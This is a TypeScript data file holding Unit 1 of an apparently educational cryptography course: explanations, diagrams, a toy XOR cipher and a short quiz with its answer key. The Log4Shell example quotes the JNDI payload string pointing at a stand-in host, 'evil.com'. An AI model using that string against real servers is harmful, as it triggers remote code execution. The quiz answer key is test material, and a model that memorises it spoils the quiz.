import { Unit } from '../types';

export const unit1: Unit = {
  id: 'unit-1',
  number: 1,
  title: 'Introduction to Cryptography & Security Architecture',
  hours: 3,
  courseOutcome: 'CO1: Analyze fundamental security threats, services, and conventional encryption models.',
  badge: 'Foundation',
  description:
    'Unit 1 establishes the foundational concepts of information security, modern cryptography, active vs passive adversarial threat vectors, taxonomy of vulnerabilities, security services, X.800 architecture, and the classic CIA triad coupled with conventional symmetric encryption models.',
  subtopics: [
    {
      slug: 'intro-to-cryptography',
      title: 'Introduction to Cryptography',
      shortDesc: 'Foundations of mathematical science protecting information confidentiality, authenticity, and integrity.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'Cryptography (from Greek kryptós "hidden" and gráphein "writing") is the scientific discipline combining mathematics, computer science, and electrical engineering to secure communication in adversarial environments. In modern digital infrastructure, cryptography transcends simple secret writing; it forms the cryptographic bedrock for distributed consensus, identity verification, financial transactions, and privacy preservation.',
        'Historically divided into classical transposition/substitution ciphers and modern algorithmic frameworks, contemporary cryptography fundamentally relies on computational complexity theory. Security proofs rely on mathematically hard problems—such as integer factorization, discrete logarithms, and elliptic curve discrete logarithms—where inversion without a secret trapdoor requires super-polynomial time.'
      ],
      realWorldExample: {
        title: 'HTTPS / TLS in Modern Web Infrastructure',
        description:
          'When connecting to banking systems or private web services, the TLS 1.3 protocol negotiates key exchanges via Diffie-Hellman, enforces identity authentication via X.509 PKI certificates, and shields payload streams with AES-GCM symmetric encryption.',
        impact: 'Protects trillions of dollars in daily e-commerce and prevents ISP-level eavesdropping and session tampering.'
      },
      keyPoints: [
        'Transforms plaintext P into ciphertext C via key K: C = E_K(P).',
        'Decryption recovers plaintext: P = D_K(C) = D_K(E_K(P)).',
        'Kerckhoffs’s Principle: The system security must reside solely in the secrecy of the key, not in the algorithm secrecy.',
        'Core pillars: Confidentiality, Data Integrity, Authentication, Non-repudiation.'
      ],
      diagram: {
        title: 'Fundamental Cryptographic Pipeline',
        type: 'ascii',
        content: `
+------------------+         Encryption Key (K)          +-------------------+
|                  |                 |                   |                   |
|  Plaintext (P)   |--------> [ Encryption E_K ] ------->|  Ciphertext (C)   |
|                  |                                     | (Untrusted Wire)  |
+------------------+                                     +-------------------+
                                                                   |
+------------------+         Decryption Key (K)                    |
|                  |                 |                             |
|  Plaintext (P)   |<------- [ Decryption D_K ] <------------------+
| (Original Match) |
+------------------+
        `,
        caption: 'Plaintext transformation across an adversarial channel under Kerckhoffs principle.'
      },
      codeSnippet: {
        language: 'typescript',
        title: 'Simple XOR Stream Cipher Model',
        code: `// Symmetric XOR Stream Demonstration
function xorCipher(text: string, keyChar: string): string {
  const k = keyChar.charCodeAt(0);
  return Array.from(text)
    .map(c => String.fromCharCode(c.charCodeAt(0) ^ k))
    .join('');
}

const original = "CONFIDENTIAL_PAYLOAD";
const key = "K";
const ciphertext = xorCipher(original, key);
const decrypted = xorCipher(ciphertext, key);

console.log("Ciphertext (hex):", Buffer.from(ciphertext).toString('hex'));
console.log("Decrypted Text:", decrypted); // Matches original`,
        explanation: 'Demonstrates the symmetric self-inverting property of bitwise XOR (A ^ B ^ B = A).'
      }
    },
    {
      slug: 'security-threats',
      title: 'Security Threats & Taxonomy',
      shortDesc: 'Potential violations of security through unauthorized disclosure, modification, deception, or disruption.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'A security threat represents any circumstance, capability, action, or event with the potential to violate security policies and cause harm by exploiting an existing system vulnerability. Threats encompass intentional adversarial attacks (nation-state APTs, cybercriminals, malicious insiders) as well as non-adversarial catastrophic occurrences (hardware faults, human configuration errors, natural catastrophes).',
        'RFC 4949 categorizes threats into four major classes: Disclosure (unauthorized access to sensitive data), Deception (falsification or fabrication of data/identity), Disruption (interruption or degradation of operational services), and Usurpation (unauthorized control or privilege escalation over infrastructure components).'
      ],
      realWorldExample: {
        title: 'SolarWinds Supply Chain Compromise (2020)',
        description:
          'Adversaries injected backdoor code (SUNBURST) into Orion IT monitoring software updates, enabling malicious access to thousands of government and corporate enterprise networks worldwide.',
        impact: 'Exposed massive federal infrastructure and compelled widespread zero-trust architecture adoption.'
      },
      keyPoints: [
        'Threat vs Attack: A threat is a potential danger; an attack is the deliberate execution of that threat.',
        'Threat Actor Spectrum: Script kiddies, hacktivists, organized crime, malicious insiders, state-sponsored APTs.',
        'Threat Modeling Frameworks: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).',
        'Attack Surface: The aggregate total sum of all accessible attack vectors in software and network infrastructure.'
      ],
      diagram: {
        title: 'STRIDE Threat Modeling Taxonomy',
        type: 'ascii',
        content: `
+----------------------------+--------------------------------------------+
| STRIDE Threat Category     | Violated Security Property / Countermeasure|
+----------------------------+--------------------------------------------+
| S - Spoofing Identity      | Authenticity (Mitigation: PKI, MFA, Kerberos)|
| T - Tampering with Data    | Integrity (Mitigation: HMAC, Digital Sigs) |
| R - Repudiation            | Non-repudiation (Mitigation: Audit Logs, DS)|
| I - Information Disclosure | Confidentiality (Mitigation: AES-256, TLS) |
| D - Denial of Service      | Availability (Mitigation: Rate Limits, CDN)|
| E - Elevation of Privilege | Authorization (Mitigation: RBAC, Least Priv)|
+----------------------------+--------------------------------------------+
        `,
        caption: 'Mapping threat archetypes to core security countermeasures.'
      }
    },
    {
      slug: 'vulnerability',
      title: 'System & Software Vulnerabilities',
      shortDesc: 'Flaws or weaknesses in system design, implementation, or operations exploitable by adversaries.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'A vulnerability is an intrinsic flaw, bug, weakness, or configuration error in a computer system, protocol, or application that can be exploited by an adversary to perform unauthorized actions. Vulnerabilities exist across multiple layers: application source code (memory corruption, injection), protocol specifications (TCP SYN spoofing, SSL renegotiation flaws), architectural design (missing authorization checks), and human operators (phishing, credential re-use).',
        'Vulnerabilities are systematically cataloged by the National Vulnerability Database (NVD) via Common Vulnerabilities and Exposures (CVE) identifiers and quantified using the Common Vulnerability Scoring System (CVSS v3.1/v4.0) measuring base metrics: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), Confidentiality (C), Integrity (I), and Availability (A).'
      ],
      realWorldExample: {
        title: 'Log4Shell (CVE-2021-44228)',
        description:
          'A JNDI lookup flaw in the widely used Apache Log4j Java logging library allowed unauthenticated remote code execution (RCE) by simply printing an adversarial string such as ${jndi:ldap://evil.com/a}.',
        impact: 'CVSS 10.0 critical score affecting millions of enterprise servers and cloud services globally.'
      },
      keyPoints: [
        'Vulnerability Lifecycle: Discovery -> Proof of Concept -> Disclosure -> Patch Release -> Patch Deployment.',
        'Zero-Day Vulnerability: A flaw actively exploited in the wild before vendor awareness or public patch availability.',
        'Common Weakness Enumeration (CWE): Taxonomy of software weaknesses (e.g., CWE-89 SQL Injection, CWE-119 Buffer Overflow).',
        'Defense in Depth: Layered security controls ensure that single-point vulnerability exploitation does not breach the core crown jewels.'
      ],
      diagram: {
        title: 'Vulnerability Exploitation Mechanics',
        type: 'ascii',
        content: `
   [ Adversary ]
         |
         | (Delivers Exploit Payload)
         v
+-------------------------------------------------------------+
| System Attack Surface                                       |
|   +-----------------------------------------------------+   |
|   | Unsanitized Input Handler                           |   |
|   |   ==> [ Software Vulnerability: Buffer Overflow ]   |   |
|   +-----------------------------------------------------+   |
|         |                                                   |
|         v (Privilege Escalation / Shellcode Execution)       |
|   +-----------------------------------------------------+   |
|   | Root OS Kernel / Data Storage Subsystem             |   |
|   +-----------------------------------------------------+   |
+-------------------------------------------------------------+
        `,
        caption: 'Exploitation trajectory from input boundary to kernel execution.'
      }
    },
    {
      slug: 'active-passive-attacks',
      title: 'Active vs. Passive Attacks',
      shortDesc: 'Classification of security attacks based on whether system resources or transmissions are modified.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'Network security attacks are fundamentally bifurcated based on whether the adversary modifies system resources or alters transmitted data streams. Passive attacks focus on learning or making use of information from the target system without affecting system resources, making them inherently difficult to detect in real-time. Active attacks involve active modification of data streams, fabrication of false information, or disruption of operational services.',
        'Passive attacks include Release of Message Contents (wiretapping, packet sniffing sensitive credentials) and Traffic Analysis (observing communication endpoints, frequency, message lengths, and burst patterns to deduce high-level tactical operations even when traffic is fully encrypted). Countermeasures for passive attacks rely strictly on mathematical encryption and traffic padding rather than real-time detection.',
        'Active attacks include Masquerade (pretending to be another authorized entity), Replay (capturing valid credential packets and re-transmitting them later), Modification of Messages (altering, delaying, or reordering transit packets), and Denial of Service (overwhelming resources to prevent legitimate user access). Active attacks are detected via cryptographic hashes, MACs, sequence counters, and nonce values.'
      ],
      realWorldExample: {
        title: 'BGP Hijacking & Man-in-the-Middle Cryptojacking',
        description:
          'Adversaries maliciously announced bogus BGP routes to redirect DNS traffic destined for Amazon Route 53 to their own servers, enabling them to actively spoof Ethereum web wallets and drain user cryptocurrency funds.',
        impact: 'Demonstrates how a routing compromise transitions from passive rerouting to an active data tampering attack.'
      },
      keyPoints: [
        'Passive Goal: Eavesdropping, interception, traffic analysis. Detection is extremely difficult; emphasis is on Prevention (Encryption).',
        'Active Goal: Modification, masquerade, replay, DoS. Prevention is difficult due to wide network attack surfaces; emphasis is on Detection and Recovery.',
        'Traffic Analysis can deduce military or financial intent even through robust ciphertexts by analyzing burst volume and packet frequency.',
        'Replay attacks bypass static password checks unless nonces, timestamps, or challenge-response protocols are deployed.'
      ],
      diagram: {
        title: 'Active vs. Passive Attack Topologies',
        type: 'ascii',
        content: `
PASSIVE ATTACK (Interception / Traffic Analysis):
[ Sender A ] ------------------ (Plaintext/Cipher) -----------------> [ Receiver B ]
                         |
                         v (Silently Snooping / No Modification)
                 [ Passive Wiretapper (Eve) ]

ACTIVE ATTACK (Modification / Masquerade / Replay):
[ Sender A ] -------> [ Attacker (Mallory) ] -------> (Tampered Data) ------> [ Receiver B ]
                     (Intercepts, Alters,
                      Drops, or Injects)
        `,
        caption: 'Passive sniffing maintains link transparency while active interception alters message payloads.'
      }
    },
    {
      slug: 'security-services-mechanisms',
      title: 'Security Services & Mechanisms (X.800)',
      shortDesc: 'ITU-T X.800 standard defining structural security services and their underlying technical mechanisms.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'The ITU-T Recommendation X.800 (Security Architecture for OSI) provides an authoritative, structured framework for defining security requirements and matching technical mechanisms. A security service is a processing or communication service provided by a protocol layer of communicating open systems, designed to ensure adequate security of systems or data transfers. A security mechanism is the concrete mathematical or operational procedure employed to implement a security service.',
        'X.800 defines five primary security service categories: Authentication (peer entity authentication and data origin authentication), Access Control (preventing unauthorized use of resources), Data Confidentiality (connection, connectionless, selective field, and traffic-flow confidentiality), Data Integrity (with or without recovery), and Non-Repudiation (with proof of origin and proof of delivery).',
        'Specific security mechanisms mapped to these services include encipherment (symmetric/asymmetric algorithms), digital signatures, access control lists (ACLs), data integrity mechanisms (hash/MAC codes), authentication exchange mechanisms, traffic padding, routing control, and notarization.'
      ],
      realWorldExample: {
        title: 'DKIM & SPF Email Security Architecture',
        description:
          'The DomainKeys Identified Mail (DKIM) standard uses cryptographic digital signatures (Mechanism) to provide Data Origin Authentication and Content Integrity (Services), while SPF provides Peer Entity validation against spoofing.',
        impact: 'Shields global corporate email ecosystems from spear-phishing and executive impersonation.'
      },
      keyPoints: [
        'Security Service: What security objective must be achieved (e.g., Confidentiality, Integrity, Non-repudiation).',
        'Security Mechanism: The technical tool used to achieve that objective (e.g., AES-256, SHA-256 HMAC, RSA Digital Signatures).',
        'X.800 Framework specifies which OSI layer should implement specific security services (e.g., Network Layer for IPsec, Transport for TLS).',
        'Pervasive Security Mechanisms: Trusted functionality, security audit trails, security recovery, and event detection.'
      ],
      diagram: {
        title: 'X.800 Services to Mechanisms Mapping',
        type: 'ascii',
        content: `
+-----------------------------+------------------------------------------------+
| Security Service (X.800)    | Implementing Security Mechanism                |
+-----------------------------+------------------------------------------------+
| Peer Entity Authentication  | Cryptographic handshake, Challenge-Response, DS|
| Data Confidentiality        | Symmetric Encipherment (AES), Asymmetric (RSA)|
| Data Integrity              | Cryptographic Hashes (SHA-256), HMAC           |
| Non-Repudiation             | Digital Signatures + Public Key Infrastructure |
| Access Control              | Role-Based Access Control (RBAC), ACLs, Tokens |
| Traffic Flow Confidentiality| Traffic Padding, Onion Routing, dummy packets  |
+-----------------------------+------------------------------------------------+
        `,
        caption: 'Correlation between abstract security objectives and operational mechanisms.'
      }
    },
    {
      slug: 'conventional-encryption-model',
      title: 'Conventional (Symmetric) Encryption Model',
      shortDesc: 'Mathematical model of symmetric cryptosystems sharing a single secret key between endpoints.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'Conventional encryption, also denoted as symmetric-key, single-key, or secret-key encryption, was the sole form of cryptosystem prior to the invention of public-key cryptography in the late 1970s. In a conventional cryptosystem, the communicating parties (Alice and Bob) must share a secret key K through a trusted out-of-band channel prior to transmitting encrypted messages over an insecure medium.',
        'The conventional encryption model consists of five essential components: (1) Plaintext P (original intelligible message), (2) Encryption Algorithm E (mathematical transformation on plaintext using secret key), (3) Secret Key K (input independent of plaintext), (4) Ciphertext C = E_K(P) (scrambled output transmitted over public wire), and (5) Decryption Algorithm D where P = D_K(C).',
        'The security of conventional encryption strictly requires: (a) a strong encryption algorithm capable of withstanding known-plaintext and chosen-ciphertext cryptanalysis, and (b) maintaining the absolute secrecy of key K. If an attacker possesses both the ciphertext and algorithm knowledge, it must be computationally infeasible to recover plaintext or key.'
      ],
      realWorldExample: {
        title: 'AES Full-Disk Encryption (BitLocker / FileVault)',
        description:
          'Operating system full-disk encryption utilizes AES-XTS with a 256-bit symmetric key stored inside a hardware Trusted Platform Module (TPM) chip to protect data-at-rest against physical laptop theft.',
        impact: 'Protects enterprise intellectual property against physical drive extraction and cold-boot attacks.'
      },
      keyPoints: [
        'Computational Efficiency: Symmetric algorithms (AES, ChaCha20) are 1000x faster than asymmetric ciphers (RSA, ECC).',
        'Key Distribution Problem: Scalability limitation of symmetric encryption; N entities require N(N-1)/2 unique secret key pairs.',
        'Brute-Force Complexity: A 128-bit key space contains 2^128 (approx 3.4 x 10^38) possibilities, immune to brute-force under physical energy limits.',
        'Cryptanalysis Types: Ciphertext-only, Known-plaintext, Chosen-plaintext, Chosen-ciphertext.'
      ],
      diagram: {
        title: 'Conventional Symmetric Cryptosystem Architecture',
        type: 'ascii',
        content: `
   +------------------+                                      +------------------+
   |   Sender Alice   |                                      |   Receiver Bob   |
   +------------------+                                      +------------------+
            |                                                         ^
            | Plaintext (P)                                           | Plaintext (P)
            v                                                         |
   +------------------+                                      +------------------+
   |  Encryption E_K  |                                      |  Decryption D_K  |
   +------------------+                                      +------------------+
            |                  Ciphertext C = E_K(P)                  ^
            +----------------- [ Insecure Channel ] ------------------+
                                        ^
                                        | (Adversary Eve)
                                        
              [ Secure Channel: Out-of-band Shared Secret Key K ]
              ---------------------------------------------------
        `,
        caption: 'Symmetric model highlighting reliance on out-of-band secure key distribution.'
      }
    },
    {
      slug: 'cia-model',
      title: 'The CIA Triad (Confidentiality, Integrity, Availability)',
      shortDesc: 'The gold-standard baseline model guiding cybersecurity architecture, governance, and threat response.',
      unitId: 'unit-1',
      unitNumber: 1,
      explanation: [
        'The CIA Triad (Confidentiality, Integrity, Availability) represents the universal cornerstone model of information security, formalized by NIST SP 800-12. Balancing these three properties is paramount: excessive confidentiality measures (such as heavy multi-step decryption or air-gapping) can degrade availability, while optimizing strictly for availability may introduce unauthorized tampering or leakage vectors.',
        'Confidentiality ensures that sensitive information is shielded from unauthorized observation or disclosure, implemented via cryptographic ciphers, granular access control matrices, and data classification tiers. Integrity safeguards the accuracy, completeness, and authentic provenance of information assets, ensuring data has not been modified, forged, or deleted in transit or at rest. Availability guarantees timely, reliable access to critical information and IT resources for legitimate authorized users whenever required.',
        'Modern security extensions expand CIA to include the Parkerian Hexad, incorporating Authenticity, Possession/Control, and Utility to address contemporary cloud, zero-trust, and AI-driven environments.'
      ],
      realWorldExample: {
        title: 'Colonial Pipeline Ransomware Incident (2021)',
        description:
          'DarkSide ransomware operators compromised an inactive VPN account lacking MFA, encrypting operational billing systems and forcing the shutdown of major fuel pipelines across the US East Coast.',
        impact: 'A catastrophic collapse of the Availability pillar causing critical national supply chain disruption.'
      },
      keyPoints: [
        'Confidentiality: Data privacy at rest, in transit, and in use. Mechanism: AES, ChaCha20, TLS, TEE.',
        'Integrity: Detection of unauthorized alterations. Mechanism: SHA-256, HMAC, digital signatures, blockchain ledgers.',
        'Availability: Uptime and resilience. Mechanism: High-availability clusters, DDoS mitigation, RAID, disaster recovery.',
        'Trade-off Matrix: Security architecture involves prioritizing these pillars based on operational mission profiles.'
      ],
      diagram: {
        title: 'CIA Triad Architectural Intersection',
        type: 'ascii',
        content: `
                          +-------------------------+
                          |     CONFIDENTIALITY     |
                          |  (Privacy & Secrecy)    |
                          +-------------------------+
                                     /   \\
                                    /     \\
                                   /  CIA  \\
                                  /   CORE  \\
                                 /           \\
           +--------------------+             +--------------------+
           |     INTEGRITY      |-------------|    AVAILABILITY    |
           | (Authentic & Valid)|             | (Uptime & Access)  |
           +--------------------+             +--------------------+
        `,
        caption: 'The tri-fold balance required for complete information assurance.'
      }
    }
  ],
  quiz: [
    {
      id: 'q1-1',
      question: 'According to Kerckhoffs’s Principle, the security of a cryptosystem must rely exclusively on which element?',
      options: [
        'The secrecy of the mathematical encryption algorithm',
        'The secrecy of the cryptographic key',
        'The physical concealment of the transmission medium',
        'The proprietary obfuscation of the hardware chipset'
      ],
      correctIndex: 1,
      explanation:
        'Kerckhoffs’s Principle dictates that a cryptosystem must remain secure even if all details of the algorithm are public knowledge, provided the secret key remains protected.'
    },
    {
      id: 'q1-2',
      question: 'Which of the following is classified as a PASSIVE attack?',
      options: [
        'Replay attack',
        'Denial of Service (DoS)',
        'Traffic analysis',
        'Message modification'
      ],
      correctIndex: 2,
      explanation:
        'Traffic analysis observes message frequency, burst sizes, and communicating endpoints without modifying transmission data, categorizing it as a passive attack.'
    },
    {
      id: 'q1-3',
      question: 'In a network of N entities communicating via conventional symmetric encryption, how many unique secret keys are required?',
      options: ['N', '2N', 'N(N - 1) / 2', 'N^2'],
      correctIndex: 2,
      explanation:
        'Each pair of communicating entities requires a unique symmetric secret key. For N entities, the number of distinct pairwise combinations is N(N - 1) / 2.'
    }
  ]
};
